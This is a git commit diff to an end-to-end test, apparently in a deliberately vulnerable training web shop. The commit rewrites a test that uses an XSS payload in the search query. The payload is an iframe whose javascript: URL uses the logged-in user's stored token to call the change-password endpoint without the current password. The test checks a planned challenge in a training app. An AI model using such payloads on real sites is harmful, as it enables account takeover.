be520a41eebbe16e67a3eb8ff81d73083bc0a4d7
Leandro Piccilli <piccilli@gmail.com>
2020-05-04 19:44:22 +0200

    Properly encode baseUrl on the request instead of hardcoded localhost

--- test/e2e/changePasswordSpec.js
+++ test/e2e/changePasswordSpec.js
@@ -33,7 +33,8 @@ describe('/#/privacy-security/change-password', () => {
     protractor.beforeEach.login({ email: 'bender@' + config.get('application.domain'), password: 'OhG0dPlease1nsertLiquor!' })
 
     it('should be able to change password via XSS-powered attack on password change without passing current password', () => {
-      browser.get(protractor.basePath + '/#/search?q=%3Ciframe%20src%3D%22javascript%3Axmlhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%20xmlhttp.open%28%27GET%27%2C%20%27http%3A%2F%2Flocalhost%3A3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26amp%3Brepeat%3DslurmCl4ssic%27%29%3B%20xmlhttp.setRequestHeader%28%27Authorization%27%2C%60Bearer%3D%24%7BlocalStorage.getItem%28%27token%27%29%7D%60%29%3B%20xmlhttp.send%28%29%3B%22%3E')
+      xssdecoded = `<iframe src="javascript:xmlhttp = new XMLHttpRequest(); xmlhttp.open('GET', '`+browser.baseUrl+`/rest/user/change-password?new=slurmCl4ssic&amp;repeat=slurmCl4ssic'); xmlhttp.setRequestHeader('Authorization',\`Bearer=\${localStorage.getItem('token')}\`); xmlhttp.send();">`
+      browser.get(protractor.basePath + '/#/search?q=' + encodeURIComponent(xssdecoded))
       browser.driver.sleep(2000)
       browser.get(protractor.basePath + '/#/login')
       element(by.id('email')).sendKeys('bender@' + config.get('application.domain'))
